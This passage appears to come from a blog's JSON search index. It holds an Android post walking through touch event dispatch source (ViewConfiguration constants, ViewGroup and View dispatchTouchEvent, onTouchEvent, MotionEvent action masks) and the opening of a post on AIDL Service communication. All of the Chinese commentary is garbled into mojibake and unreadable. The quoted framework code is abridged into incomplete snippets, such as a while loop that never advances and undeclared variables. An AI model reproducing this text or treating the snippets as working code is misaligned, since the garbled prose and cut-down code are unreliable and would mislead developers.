‡å‡†çš„å¸¸é‡ç”¨æ¥è®¾ç½®UIçš„è¶…æ—¶ã€å¤§å°å’Œè·ç¦» */ public class ViewConfiguration { // è®¾å®šæ°´å¹³æ»šåŠ¨æ¡çš„å®½åº¦å’Œå‚ç›´æ»šåŠ¨æ¡çš„é«˜åº¦ï¼Œå•ä½æ˜¯åƒç´ px private static final int SCROLL_BAR_SIZE = 10; //å®šä¹‰æ»šåŠ¨æ¡é€æ¸æ¶ˆå¤±çš„æ—¶é—´ï¼Œå•ä½æ˜¯æ¯«ç§’ private static final int SCROLL_BAR_FADE_DURATION = 250; // é»˜è®¤çš„æ»šåŠ¨æ¡å¤šå°‘ç§’ä¹‹åæ¶ˆå¤±ï¼Œå•ä½æ˜¯æ¯«ç§’ private static final int SCROLL_BAR_DEFAULT_DELAY = 300; // å®šä¹‰è¾¹ç¼˜åœ°æ–¹è¤ªè‰²çš„é•¿åº¦ private static final int FADING_EDGE_LENGTH = 12; //å®šä¹‰å­æ§ä»¶æŒ‰ä¸‹çŠ¶æ€çš„æŒç»­äº‹ä»¶ private static final int PRESSED_STATE_DURATION = 125; //å®šä¹‰ä¸€ä¸ªæŒ‰ä¸‹çŠ¶æ€è½¬å˜æˆé•¿æŒ‰çŠ¶æ€çš„è½¬å˜æ—¶é—´ private static final int LONG_PRESS_TIMEOUT = 500; //å®šä¹‰ç”¨æˆ·åœ¨æŒ‰ä½é€‚å½“æŒ‰é’®ï¼Œå¼¹å‡ºå…¨å±€çš„å¯¹è¯æ¡†çš„æŒç»­æ—¶é—´ private static final int GLOBAL_ACTIONS_KEY_TIMEOUT = 500; //å®šä¹‰ä¸€ä¸ªtouchäº‹ä»¶ä¸­æ˜¯ç‚¹å‡»äº‹ä»¶è¿˜æ˜¯ä¸€ä¸ªæ»‘åŠ¨äº‹ä»¶æ‰€éœ€çš„æ—¶é—´ï¼Œå¦‚æœç”¨æˆ·åœ¨è¿™ä¸ªæ—¶é—´ä¹‹å†…æ»‘åŠ¨ï¼Œé‚£ä¹ˆå°±è®¤ä¸ºæ˜¯ä¸€ä¸ªç‚¹å‡»äº‹ä»¶ private static final int TAP_TIMEOUT = 115; /** * Defines the duration in milliseconds we will wait to see if a touch event * is a jump tap. If the user does not complete the jump tap within this interval, it is * considered to be a tap. */ //å®šä¹‰ä¸€ä¸ªtouchäº‹ä»¶æ—¶å€™æ˜¯ä¸€ä¸ªç‚¹å‡»äº‹ä»¶ã€‚å¦‚æœç”¨æˆ·åœ¨è¿™ä¸ªæ—¶é—´å†…æ²¡æœ‰å®Œæˆè¿™ä¸ªç‚¹å‡»ï¼Œé‚£ä¹ˆå°±è®¤ä¸ºæ˜¯ä¸€ä¸ªç‚¹å‡»äº‹ä»¶ private static final int JUMP_TAP_TIMEOUT = 500; //å®šä¹‰åŒå‡»äº‹ä»¶çš„é—´éš”æ—¶é—´ private static final int DOUBLE_TAP_TIMEOUT = 300; //å®šä¹‰ä¸€ä¸ªç¼©æ”¾æ§åˆ¶åé¦ˆåˆ°ç”¨æˆ·ç•Œé¢çš„æ—¶é—´ private static final int ZOOM_CONTROLS_TIMEOUT = 3000; /** * Inset in pixels to look for touchable content when the user touches the edge of the screen */ private static final int EDGE_SLOP = 12; /** * Distance a touch can wander before we think the user is scrolling in pixels */ private static final int TOUCH_SLOP = 16; /** * Distance a touch can wander before we think the user is attempting a paged scroll * (in dips) */ private static final int PAGING_TOUCH_SLOP = TOUCH_SLOP * 2; /** * Distance between the first touch and second touch to still be considered a double tap */ private static final int DOUBLE_TAP_SLOP = 100; /** * Distance a touch needs to be outside of a window&#39;s bounds for it to * count as outside for purposes of dismissing the window. */ private static final int WINDOW_TOUCH_SLOP = 16; //ç”¨æ¥åˆå§‹åŒ–flingçš„æœ€å°é€Ÿåº¦ï¼Œå•ä½æ˜¯æ¯ç§’å¤šå°‘åƒç´  private static final int MINIMUM_FLING_VELOCITY = 50; //ç”¨æ¥åˆå§‹åŒ–flingçš„æœ€å¤§é€Ÿåº¦ï¼Œå•ä½æ˜¯æ¯ç§’å¤šå°‘åƒç´  private static final int MAXIMUM_FLING_VELOCITY = 4000; //è§†å›¾ç»˜å›¾ç¼“å­˜çš„æœ€å¤§å°ºå¯¸ï¼Œä»¥å­—èŠ‚è¡¨ç¤ºã€‚åœ¨ARGB888æ ¼å¼ä¸‹ï¼Œè¿™ä¸ªå°ºå¯¸åº”è‡³å°‘ç­‰äºå±å¹•çš„å¤§å° @Deprecated private static final int MAXIMUM_DRAWING_CACHE_SIZE = 320 * 480 * 4; // HVGA screen, ARGB8888 //flingså’Œscrollsæ‘©æ“¦åŠ›åº¦å¤§å°çš„ç³»æ•° private static float SCROLL_FRICTION = 0.015f; /** * Max distance to over scroll for edge effects */ private static final int OVERSCROLL_DISTANCE = 0; /** * Max distance to over fling for edge effects */ private static final int OVERFLING_DISTANCE = 4; } æ¥çœ‹æºç åº”ç”¨å±‚çš„äº‹ä»¶çš„å¼€å§‹æ˜¯ä»Activity.dispatchTouchEventå¼€å§‹çš„Activity.dispatchTouchEvent -&gt; getWindow().superDispatchTouchEvent(ev) -&gt; ViewGroup.dispatchTouchEvent(ev) ã€‚ViewGroup.javaï¼Œåˆ æ‰ä¸€äº›æ— å…³çš„ä»£ç  @Override public boolean dispatchTouchEvent(MotionEvent ev) { boolean handled = false; final int action = ev.getAction(); final int actionMasked = action &amp; MotionEvent.ACTION_MASK; // Handle an initial down. // 1. åœ¨ACTION_DOWNçš„æ—¶å€™æŠŠçŠ¶æ€å¤åŸ if (actionMasked == MotionEvent.ACTION_DOWN) { // Throw away all previous state when starting a new touch gesture. // The framework may have dropped the up or cancel event for the previous gesture // due to an app switch, ANR, or some other state change. //è¿™é‡Œçš„æ³¨é‡Šè¯´æ˜äº†frameworkåœ¨ä¸Šä¸€æ¬¡æ‰‹åŠ¿ä¸­æœªå¿…èƒ½æŠŠdown - move - up çš„æ•´ä¸ªåç»­æµç¨‹å…¨éƒ¨deliveråˆ°ï¼ŒåŸå› ect... æ‰€ä»¥è¿™é‡Œè¦ç¡®ä¿åœ¨ä¸€æ¬¡å…¨æ–°çš„æ‰‹åŠ¿å¼€å§‹ä¹‹åˆ clear all states cancelAndClearTouchTargets(ev); resetTouchState(); } // Check for interception. // 2. åˆ¤æ–­ViewGroupæ˜¯å¦æ‹¦æˆªtouchäº‹ä»¶ã€‚å½“ä¸ºACTION_DOWNæˆ–è€…æ‰¾åˆ°èƒ½å¤Ÿæ¥æ”¶touchäº‹ä»¶çš„å­View // æ—¶ï¼Œç”±onInterceptTouchEvent(event)å†³å®šæ˜¯å¦æ‹¦æˆªã€‚å…¶ä»–æƒ…å†µï¼Œå³ACTION_MOVE/ACTION_UPä¸” // æ²¡æ‰¾åˆ°èƒ½å¤Ÿæ¥æ”¶touchäº‹ä»¶çš„å­Viewæ—¶ï¼Œç›´æ¥æ‹¦æˆªã€‚ final boolean intercepted; if (actionMasked == MotionEvent.ACTION_DOWN || mFirstTouchTarget != null) { // è¿™ä¸ªfirstTargetå°±æ˜¯å­Viewé‡Œé¢è°ç¬¬ä¸€ä¸ªç«™å‡ºæ¥è¯´æ„¿æ„æ¥å— final boolean disallowIntercept = (mGroupFlags &amp; FLAG_DISALLOW_INTERCEPT) != 0; if (!disallowIntercept) { //è¿™ä¸ªå°±æ˜¯requestDisallowInterceptTouchEventï¼ˆæ˜¯childè¯´ä¸å…è®¸çˆ¶å…ƒç´ æ‹¦æˆªï¼‰ intercepted = onInterceptTouchEvent(ev); //è¿™ä¸ªæ˜¯æ­£å¸¸çš„æµç¨‹ ev.setAction(action); // restore action in case it was changed } else { intercepted = false; } } else { // There are no touch targets and this action is not an initial down // so this view group continues to intercept touches. intercepted = true; } //ä»è¿™é‡Œä¹Ÿèƒ½çœ‹å‡ºæ¥ï¼ŒonInterceptTouchEventçš„è°ƒç”¨æ—¶æœºæ˜¯ç¬¬ä¸€æ¬¡ACTION_DOWNã€‚ä»¥åŠåœ¨å·²ç»æœ‰æ„¿æ„åœ¨dispatchTouchEventé‡Œé¢è¿”å›trueçš„childçš„å‰æä¸‹ï¼Œæ‰€æœ‰çš„åç»­åŠ¨ä½œã€‚æ‰€ä»¥è¿™ä¸ªçˆ¶ViewGroupéšæ—¶å¯ä»¥ä»å­Viewå‰æ‹¦æˆªEventï¼Œæˆ–è€…è¯´åœ¨ä¸€ä¸ªgestureä¸­ï¼Œåœ¨å·²ç»æœ‰View childç«™å‡ºæ¥è¯´æ„¿æ„æ‰¿æ‹…çš„å‰æä¸‹ï¼Œçˆ¶ViewGroupéšæ—¶å¯ä»¥åœ¨onInterceptXXXä¸­æ‹¦æˆªä¸‹æ¥ //3. éå†childçš„forå¾ªç¯å¼€å§‹ for (int i = childrenCount - 1; i &gt;= 0; i--) { final int childIndex = getAndVerifyPreorderedIndex( childrenCount, i, customOrder); final View child = getAndVerifyPreorderedView( preorderedList, children, childIndex); newTouchTarget = getTouchTarget(child); // mFirstTouchTargetæ˜¯ä¸€ä¸ªé“¾è¡¨ï¼Œéå†è¿™ä¸ªé“¾è¡¨ï¼Œå¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªtargetçš„childæ˜¯å½“å‰ViewGroupçš„childï¼Œè¯´æ˜æ‰¾åˆ°ï¼Œç›´æ¥breakå‡ºæ¥ if (newTouchTarget != null) { // Child is already receiving touch within its bounds. // Give it the new pointer in addition to the ones it is handling. newTouchTarget.pointerIdBits |= idBitsToAssign; break; } if (dispatchTransformedTouchEvent(ev, false, child, idBitsToAssign)) { // Child wants to receive touch within its bounds. //è¿™ä¸ªdispatchTransformedTouchEventå°±æ˜¯ mLastTouchDownX = ev.getX(); mLastTouchDownY = ev.getY(); newTouchTarget = addTouchTarget(child, idBitsToAssign); //è¿™ä¸ªæ‹¬å·é‡Œé¢å°±æ˜¯è¯´æ˜æœ‰ä¸€ä¸ªchildæ„¿æ„æ¥å—eventï¼ˆåœ¨dispatchTouchEventé‡Œé¢è¿”å›äº†trueï¼‰,addTouchTargetå…¶å®æ˜¯ä¸ºä¸Šä¸€ä¸ªbreakæœåŠ¡çš„ï¼Œæ‰€ä»¥æ¯æ¬¡eventä¼ é€’ä¸‹æ¥çš„æ—¶å€™,åœ¨è¿™é‡ŒaddTouchTargetï¼Œä¸‹ä¸€æ¬¡åœ¨ä¸Šé¢çš„getTouchTargetå°±breakäº†ã€‚ alreadyDispatchedToNewTouchTarget = true; break; } } /// éå†childçš„forå¾ªç¯åˆ°æ­¤ç»“æŸã€‚è¿™ä¸ªforå¾ªç¯æœ‰ç‚¹é•¿ï¼Œå…¶å®åªéœ€è¦å…³æ³¨å“ªé‡Œbreakå‡ºæ¥äº†ï¼Œå®é™…ä¸Šæœ‰ä¸¤å¤„ã€‚ï¼Œgå…³é”®åœ¨åä¸€å¤„ï¼Œå°±æ˜¯å°†eventäº¤ç»™child,æŠŠeventé’ˆå¯¹childè°ƒæ•´ä¸€ä¸‹xå’Œyï¼Œè°ƒç”¨childçš„dispatchTouchEvent. // Dispatch to touch targets. // 4. æŠŠäº‹ä»¶è½¬äº¤ç»™æ„¿æ„æ¥å—çš„çˆ±è°è° if (mFirstTouchTarget == null) { // No touch targets so treat this as an ordinary view. handled = dispatchTransformedTouchEvent(ev, canceled, null, TouchTarget.ALL_POINTER_IDS); } else { // Dispatch to touch targets, excluding the new touch target if we already // dispatched to it. Cancel touch targets if necessary. while (target != null) { if (alreadyDispatchedToNewTouchTarget &amp;&amp; target == newTouchTarget) { handled = true; } else { if (dispatchTransformedTouchEvent(ev, cancelChild, target.child, target.pointerIdBits)) { handled = true; } } } } // æŠŠtargetè¿™ä¸ªé“¾è¡¨èµ°ä¸€éï¼Œä¹‹è¦æœ‰ä¸€ä¸ªtargetæ„¿æ„åœ¨dispatchTouchEventé‡Œé¢è¿”å›trueï¼Œå°±è®¤ä¸ºhandledå¹¶è¿”å› return handled; } ä¸Šé¢çš„æ˜¯viewGroupçš„dispatchTouchEventï¼Œç»“è®ºæ˜¯å¦‚æœå­Viewåœ¨dispatchTouchEventé‡Œé¢è¿”å›äº†trueï¼Œåç»­äº‹ä»¶éƒ½ä¼š(æ‰€æœ‰çš„ï¼Œä¸ç®¡æ˜¯ACTION_DOWN,UP,è¿˜æ˜¯MOVE)é€šè¿‡dispatchTransformedTouchEventæ–¹æ³•ä¼ é€’åˆ°childçš„dispatchTouchEventï¼ˆå¦‚æœchildæ˜¯ä¸€ä¸ªViewGroupï¼Œè¿™æ ·çš„æŸ¥æ‰¾è¿˜ä¼šç»§ç»­ä¸‹å»ï¼Œä¸€ç›´åˆ°childæ˜¯Viewä¸æ˜¯ViewGroupï¼‰ã€‚ Viewçš„dispatchToucheEventå°±æ˜¾å¾—æä¸ºç®€å•ï¼Œæ¯ä¸€æ¬¡Eventéƒ½ä¼šç”¨mOnTouchListenerè¯•ä¸€ä¸‹è¿”å›å€¼ï¼ˆmOnTouchListenerè¿”å›trueçš„è¯ä¸ä¼šæ‰onTouchEventï¼‰ï¼ŒonTouchEventå°±åˆå˜å¾—å¤æ‚è®¸å¤šã€‚ View,ViewGroupçš„dispatchTouchEventï¼ŒrequestDisAllowInterceptTouchEvent,onTouchEventè¿™äº›éƒ½æ˜¯å¯ä»¥æœ‰æ¡ä»¶çš„è¿”å›trueæˆ–falseçš„ï¼Œè¿™äº›å¯ä»¥overrideçš„æ–¹æ³•ç»™äº†ç¨‹åºè®¾è®¡ä»¥æå¤§çš„çµæ´»æ€§ã€‚ Viewçš„onTouchEventç®€å•è¯´å°±æ˜¯ä¸€å¤§å †çš„switch caseView.java public boolean onTouchEvent(MotionEvent event) { if (clickable || (viewFlags &amp; TOOLTIP) == TOOLTIP) { switch (action) { case MotionEvent.ACTION_UP: if (!mHasPerformedLongPress &amp;&amp; !mIgnoreNextUpEvent) { // This is a tap, so remove the longpress check removeLongPressCallback(); // Only perform take click actions if we were in the pressed state if (!focusTaken) { // Use a Runnable and post this rather than calling // performClick directly. This lets other visual state // of the view update before click actions start. //è¿™æ®µæ³¨é‡Šå…¶å®è¯´åˆ°äº†postè¿™ä¸ªæ–¹æ³•ï¼ŒmessageQueueæœ¬èº«æ˜¯ä¸€ä¸ªä¸ªå¤„ç†çš„ã€‚æ‰‹æŒ‡æŠ¬èµ·çš„æ—¶å€™ï¼Œä¼˜å…ˆæ›´æ–°UIï¼Œç‚¹å‡»äº‹ä»¶can wait . æ¯”æ–¹onClické‡Œé¢è€—æ—¶10sï¼ŒæŠ¬èµ·æ‰‹10såæ‰çœ‹åˆ°æŒ‰é’®å˜æˆunPressedStateï¼Œè¿™æ˜¾ç„¶æ˜¯ä¸åˆç†çš„ if (!post(mPerformClick)) { //æ‰€ä»¥æˆ‘ä»¬åœ¨onClické‡Œé¢æ‰“æ–­ç‚¹ï¼Œå †æ ˆå‰é¢ä»æ¥ä¸æ˜¯OnTouchEvent performClick(); // æˆ‘ä»¬å–œçˆ±çš„onClickListenerå°±åœ¨è¿™é‡Œå•¦ } } } removeTapCallback(); //Tapå°±æ˜¯postä¸€ä¸ªrunnableï¼Œrunçš„æ—¶å€™setPressedï¼Œå†postLongClick mIgnoreNextUpEvent = false; break; case MotionEvent.ACTION_DOWN: // Walk up the hierarchy to determine if we&#39;re inside a scrolling container. boolean isInScrollingContainer = isInScrollingContainer(); // For views inside a scrolling container, delay the pressed feedback for // a short period in case this is a scroll. if (isInScrollingContainer) { mPrivateFlags |= PFLAG_PREPRESSED; if (mPendingCheckForTap == null) { mPendingCheckForTap = new CheckForTap(); } mPendingCheckForTap.x = event.getX(); mPendingCheckForTap.y = event.getY(); postDelayed(mPendingCheckForTap, ViewConfiguration.getTapTimeout()); } else { // Not inside a scrolling container, so show the feedback right away //è¿™æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„onLongClickListenerè¢«è§¦å‘çš„åœ°æ–¹äº† setPressed(true, x, y); checkForLongClick(0, x, y); //è¿™é‡Œé¢å°±æ˜¯postDelayä¸€ä¸ªlongClickRunnableï¼Œæ—¶é—´æ˜¯ViewConfiguration.getLongPressTimeout()ï¼Œé»˜è®¤500msã€‚ } break; case MotionEvent.ACTION_CANCEL: if (clickable) { setPressed(false); } removeTapCallback(); removeLongPressCallback(); mInContextButtonPress = false; mHasPerformedLongPress = false; mIgnoreNextUpEvent = false; mPrivateFlags3 &amp;= ~PFLAG3_FINGER_DOWN; break; case MotionEvent.ACTION_MOVE: // Be lenient about moving outside of buttons //æ‰‹æŒ‡æ»‘åŠ¨çš„æ—¶å€™æŒªå‡ºäº†Buttonçš„è¯ï¼Œå–æ¶ˆæŒ‰å‹çŠ¶æ€ if (!pointInView(x, y, mTouchSlop)) { // Outside button // Remove any future long press/tap checks removeTapCallback(); removeLongPressCallback(); if ((mPrivateFlags &amp; PFLAG_PRESSED) != 0) { setPressed(false); } } break; } return true; //è¿™é‡Œå¾ˆä¹è§‚åœ°è¿”å›äº†true } return false; } ä¹‹å‰è¯´çš„TouchEventä»Activityç”±ä¸Šå¾€ä¸‹ä¼ é€’å†å¾€ä¸Šä¼ é€’çš„è¿‡ç¨‹æ˜¯æ²¡æœ‰é”™çš„DecorViewé€šè¿‡Window.callback(å…¶å®å°±æ˜¯Actvity)å¼€å§‹Activity.java public boolean dispatchTouchEvent(MotionEvent ev) { if (ev.getAction() == MotionEvent.ACTION_DOWN) { onUserInteraction(); } if (getWindow().superDispatchTouchEvent(ev)) { return true; } //å¦‚æœç»å†äº†ViewGroup -&gt; View éƒ½ä¸æ„¿æ„å¤„ç†çš„è¯ï¼Œæ˜¯ä¼šä¸¢å›Activityçš„ return onTouchEvent(ev); } è€Œåœ¨ViewGroupé‚£ä¸€å±‚ï¼Œå¦‚æœäº¤ç»™child.dispatchTouchEventéƒ½ä¸æ„¿å¤„ç†çš„è¯ï¼Œé»˜è®¤ä¼šè°ƒç”¨View.dispatchTouchEventï¼Œè¿™é‡Œé¢å¤šåŠä¼šè°ƒåˆ°è‡ªå·±çš„onTouchEventã€‚æ‰€ä»¥Activity -&gt; ViewGroup -&gt; View -&gt; ViewGroup -&gt; Activityè¿™ä¸€ä¸ªæµç¨‹æ˜¯æ²¡é”™çš„ã€‚éš¾ç‚¹å°±åœ¨äºè¿™ä¸ªViewGroup -&gt; Viewçš„å±‚çº§æœ‰å¤šæ·±ã€‚åœ¨ViewGroupé‡Œé¢ï¼Œå¾€å­Viewä¸‹å‘TouchEventçš„å”¯ä¸€é€”å¾„æ˜¯dispatchTransformedTouchEventã€‚è¿™ä¸ªæ–¹æ³•çš„è°ƒç”¨æ¬¡æ•°ä¹Ÿä¸å¤šï¼Œä¼°è®¡å°±æ˜¯åœ¨è¿™é‡Œæ§åˆ¶ä½çš„ã€‚ TouchEventåªæ˜¯javaå±‚çš„æŠ½è±¡Linuxå†…æ ¸ä¼šå°†ç¡¬ä»¶äº§ç”Ÿçš„è§¦æ‘¸äº‹ä»¶åŒ…è£…ä¸ºEventå­˜åˆ°/dev/input/event[x]ç›®å½•ä¸‹å½“å±å¹•è¢«è§¦æ‘¸ï¼ŒLinuxå†…æ ¸ä¼šå°†ç¡¬ä»¶äº§ç”Ÿçš„è§¦æ‘¸äº‹ä»¶åŒ…è£…ä¸ºEventå­˜åˆ°/dev/input/event[x]ç›®å½•ä¸‹ã€‚å¯¹ï¼Œä½ æ²¡çœ‹é”™ï¼Œäº‹ä»¶è¢«ææˆæ–‡ä»¶ä¿å­˜äº†ä¸‹æ¥ï¼æ¥ç€ï¼Œç³»ç»Ÿåˆ›å»ºçš„ä¸€ä¸ªInputReaderThreadçº¿ç¨‹loopèµ·æ¥è®©EventHubè°ƒç”¨getEvent()ä¸æ–­çš„ä»/dev/input/æ–‡ä»¶å¤¹ä¸‹è¯»å–è¾“å…¥äº‹ä»¶ã€‚ç„¶åInputReaderåˆ™ä»EventHubä¸­è·å¾—äº‹ä»¶äº¤ç»™InputDispatchã€‚è€ŒInputDispatchåˆä¼šæŠŠäº‹ä»¶åˆ†å‘åˆ°éœ€è¦çš„åœ°æ–¹ï¼Œæ¯”å¦‚ViewRootImplçš„WindowInputEventReceiverä¸­ã€‚ä»¥ä¸Šè¿‡ç¨‹æ˜¯åœ¨åº•å±‚ä¸­å®Œæˆï¼Œå¤§éƒ¨åˆ†ç”±c++å®ç°ï¼Œæˆ‘ä»¬äº†è§£æµç¨‹å°±å¥½ 7. ä»cppå±‚åˆ°javaå±‚çš„è½¬æ¢ä»åº•å±‚cppè¯´å»ä»cppå±‚è®²åˆ°javaå±‚ â€‹ 8. MotionEvent.getActionå’ŒMotionEvent.getActionMaskedçš„åŒºåˆ«å…ˆæ¥çœ‹ä¸‹è¿™äº›æ•°åˆ†åˆ«æ˜¯å¤šå°‘ ACTION_MASK 0x000000ff (0xè¡¨ç¤º16è¿›åˆ¶ï¼Œä¸¤ä¸ªæ•°ä»£è¡¨ä¸€ä¸ªbyte,8ä½ï¼Œæ‰€ä»¥éƒ½æ˜¯Int) ACTION_DOWN 0x00000000 ACTION_UP 0x00000001 ACTION_MOVE 0x00000002 ACTION_POINTER_DOWN 0x00000005 ACTION_POINTER_UP 0x00000006 ACTION_POINTER_1_DOWN 0x00000005 ACTION_POINTER_1_UP 0x00000006 ACTION_POINTER_2_DOWN 0x00000105 ACTION_POINTER_2_UP 0x00000106 ACTION_POINTER_3_DOWN 0x00000205 ACTION_POINTER_3_UP 0x00000206 public final int getAction() { return nativeGetAction(mNativePtr); } public final int getActionMasked() { return nativeGetAction(mNativePtr) &amp; ACTION_MASK; } public final int getActionIndex() { return (nativeGetAction(mNativePtr) &amp; ACTION_POINTER_INDEX_MASK) &gt;&gt; ACTION_POINTER_INDEX_SHIFT; } æˆ‘ä»¬å‘ç°å•æŒ‡DOWN/UPåˆ†åˆ«ä¸º 0x005å’Œ0x006, è€ŒåŒå€¼å’Œä¸‰æŒ‡DOWN/UPåˆ†åˆ«ä¸º 0x105å’Œ0x106,0x205å’Œ0x206å‡è®¾å½“å‰è§¦æ‘¸åŠ¨ä½œä¸ºACTIONPOINTER2_DOWNæ—¶ï¼Œ int action=0x105; int maskAction=0x0ff&amp;0x105; // maskAction=0x005; å¦‚æ­¤ï¼Œè§¦æ‘¸åŠ¨ä½œå«ä¹‰æ”¹å˜ä¸ºACTIONPOINTERDOWNã€‚ä¸‰æ ¹æ‰‹æŒ‡åŒæ—¶moveæ±‡é›†åˆ°åº”ç”¨å±‚ï¼Œæ¥æ”¶åˆ°çš„æ˜¯ACTION_POINTER_3_MOVE.ç»“è®ºæ˜¯ï¼ŒgetActionIndexå°±æ˜¯è·å– 0x00000206 é‡Œé¢é‚£ä¸ª2ï¼Œä¹Ÿå°±æ˜¯ç¬¬å‡ æ ¹æ‰‹æŒ‡ä¸Šå»çš„ã€‚getActionMaskedå°±æ˜¯ï¼Œæˆ‘ä¸ç®¡ä½ æ˜¯1æ ¹æ‰‹æŒ‡DOWNï¼Œ2æ ¹æ‰‹æŒ‡DOWNè¿˜æ˜¯3æ ¹æ‰‹æŒ‡DOWNä¸Šå»ï¼Œmaskä¹‹åå…¨éƒ¨å˜æˆACTION_DOWNã€‚æ‰€ä»¥ä¸€èˆ¬æ¥è¯´ï¼ŒACTION_POINTER_2_DOWNè¿™ä¸€ç±»çš„ä¸œè¥¿é€šå¸¸ç”¨äºå¤šç‚¹è§¦æ§ã€‚ä¸€ä¸ªInt 4ä¸ªbyteï¼Œç¬¬ä¸‰ä¸ªbyteä¿å­˜indexï¼ˆç¬¬å‡ æ ¹æ‰‹æŒ‡ï¼‰ï¼Œç¬¬å››ä¸ªbyteä¿å­˜ç±»å‹ï¼ˆDOWN,MOVEè¿˜æ˜¯åˆ«çš„ä»€ä¹ˆï¼‰ å¦‚æœViewæ²¡æœ‰æ¶ˆè´¹ACTION_DOWNäº‹ä»¶ï¼Œåˆ™ä¹‹åçš„ACTION_MOVEç­‰äº‹ä»¶éƒ½ä¸ä¼šå†æ¥æ”¶ã€‚ å¦å¤–,addTouchTargetæ–¹æ³•åœ¨éå†å½“å‰childè¿‡ç¨‹ä¸­åªè¦æ‰¾åˆ°ä¸€ä¸ªå°±breakå½“å‰éå†ï¼Œæ‰€ä»¥æ­£å¸¸æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé“¾è¡¨åªä¼šæœ‰ä¸€ä¸ªã€‚ä½†æ˜¯ï¼Œè¿™ä¸ªéå†å¤–é¢è¿˜åŒ…è£¹äº†ä¸€ä¸ª actionMasked == MotionEvent.ACTION_DOWN || (split &amp;&amp; actionMasked == MotionEvent.ACTION_POINTER_DOWN) || actionMasked == MotionEvent.ACTION_HOVER_MOVE æ‰€ä»¥ï¼Œå‡å¦‚ä¸€å¼€å§‹ä¸€æ ¹æ‰‹æŒ‡ä¸Šå»ï¼Œå‘ç”Ÿäº†ACTION_DOWNï¼Œéšåè¿™åªæ‰‹æŒ‡ä¸æ”¾å¼€ï¼Œå†ä¸Šå»ä¸€æ ¹æ‰‹æŒ‡ï¼Œå°±è§¦å‘äº†ACTION_POINTER_DOWNï¼Œåˆä¼šå»éå†ï¼Œå¹¶å¯èƒ½è°ƒç”¨addTouchTargetæ–¹æ³•ï¼ŒTouchTargeté‡Œé¢æœ‰ä¸€ä¸ªæˆå‘˜éå†pointerIdBitsï¼Œå¯ä»¥è®¤ä¸ºæ˜¯ç»‘å®šçš„è¿™æ ¹æ‰‹æŒ‡çš„idã€‚å¦å¤–ï¼Œåœ¨dispatchTouchEventæœ€ä¸€å¼€å§‹æ˜¯ä¼šå°†ä¹‹å‰ä¿ç•™çš„touchTargeté˜Ÿåˆ—æ¸…ç©ºçš„ï¼Œåœ¨ACTION_UPé‡Œé¢ä¹Ÿåšäº† if (actionMasked == MotionEvent.ACTION_DOWN) { // Throw away all previous state when starting a new touch gesture. // The framework may have dropped the up or cancel event for the previous gesture // due to an app switch, ANR, or some other state change. cancelAndClearTouchTargets(ev); resetTouchState(); } Reference å›¾è§£å®‰å“äº‹ä»¶åˆ†å‘æœºåˆ¶ making sense of the touch system Android onTouchEvent, onClickåŠonLongClickçš„è°ƒç”¨æœºåˆ¶ Androidè§¦æ‘¸äº‹ä»¶æœºåˆ¶(ä¸‰) ViewConfigurationç”¨æ³• è§¦æ‘¸äº‹ä»¶çš„åˆ†æä¸æ€»ç»“ Viewäº‹ä»¶åˆ†å‘åŠæ¶ˆè´¹æºç åˆ†æçœ‹è¿™ç¯‡æ–‡ç« å°±å¤Ÿäº†","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"}]},{"title":"serviceå’Œactivityçš„é€šä¿¡æ–¹å¼","date":"2016-09-30T15:25:28.000Z","path":"2016/09/30/2016-09-30-service-activity-communication/","text":"ä¸€å¹´ä»¥å‰å†™è¿‡ä¸€ç¯‡å…³äºserviceå’ŒActivityç›¸äº’é€šä¿¡çš„å¾ˆè¯¦ç»†çš„åšå®¢ï¼Œå½“æ—¶çœŸçš„æ˜¯è´¹äº†å¾ˆå¤§å¿ƒæ€åœ¨ä¸Šé¢ã€‚ç°åœ¨å›è¿‡å¤´æ¥çœ‹ï¼Œè¿˜æ˜¯æœ‰äº›ä¸å®Œå–„çš„åœ°æ–¹ï¼Œæ¯”å¦‚aidlæ²¡æœ‰ç»™ï¼Œdemoä¸å¤Ÿå…¨é¢ã€‚ç°åœ¨è¡¥ä¸Šã€‚ 1. å…³äºAndroidçš„Serviceï¼Œå®˜æ–¹æ–‡æ¡£æ˜¯è¿™æ ·æè¿°çš„ Service æ˜¯ä¸€ä¸ªå¯ä»¥åœ¨åå°æ‰§è¡Œé•¿æ—¶é—´è¿è¡Œæ“ä½œè€Œä¸ä½¿ç”¨ç”¨æˆ·ç•Œé¢çš„åº”ç”¨ç»„ä»¶ã€‚æœåŠ¡å¯ç”±å…¶ä»–åº”ç”¨ç»„ä»¶å¯åŠ¨ï¼Œè€Œä¸”å³ä½¿ç”¨æˆ·åˆ‡æ¢åˆ°å…¶ä»–åº”ç”¨ï¼ŒæœåŠ¡ä»å°†åœ¨åå°ç»§ç»­è¿è¡Œã€‚ æ­¤å¤–ï¼Œç»„ä»¶å¯ä»¥ç»‘å®šåˆ°æœåŠ¡ï¼Œä»¥ä¸ä¹‹è¿›è¡Œäº¤äº’ï¼Œç”šè‡³æ˜¯æ‰§è¡Œè¿›ç¨‹é—´é€šä¿¡ (IPC)ã€‚ ä¾‹å¦‚ï¼ŒæœåŠ¡å¯ä»¥å¤„ç†ç½‘ç»œäº‹åŠ¡ã€æ’­æ”¾éŸ³ä¹ï¼Œæ‰§è¡Œæ–‡ä»¶ I/O æˆ–ä¸å†…å®¹æä¾›ç¨‹åºäº¤äº’ï¼Œè€Œæ‰€æœ‰è¿™ä¸€åˆ‡å‡å¯åœ¨åå°è¿›è¡Œã€‚ è¿™å…¶ä¸­ä¹Ÿèƒ½çœ‹å‡ºAndroidå¯¹äºServiceè§’è‰²çš„å®šä½ï¼Œåå°å·¥ä½œï¼Œä¸æ¶‰åŠUIã€‚ Serviceæœ¬èº«åŒ…å«started Serviceå’ŒBinded Service å¯¹äºBinded Service ä½¿ç”¨ 2. AIDLå†™æ³•ä»¥ä¸‹ä»£ç æ¥è‡ªç®€ä¹¦ interface IMyAidlInterface { /** * Demonstrates some basic types that you can use as parameters * and return values in AIDL. */ void basicTypes(int anInt, long aLong, boolean aBoolean, float aFloat, double aDouble, String aString); String getName(String nickName); } public class AIDLService extends Service { IMyAidlInterface.Stub mStub = new IMyAidlInterface.Stub() { //è¿™ä¸ªclassæ˜¯ç¼–è¯‘åç”Ÿæˆçš„ @Override public void basicTypes(int anInt, long aLong, boolean aBoolean, float aFloat, double aDouble, String aString) throws RemoteException { } @Override public String getName(String nickName) throws RemoteException { return &quot;aidl &quot; + nickName; } 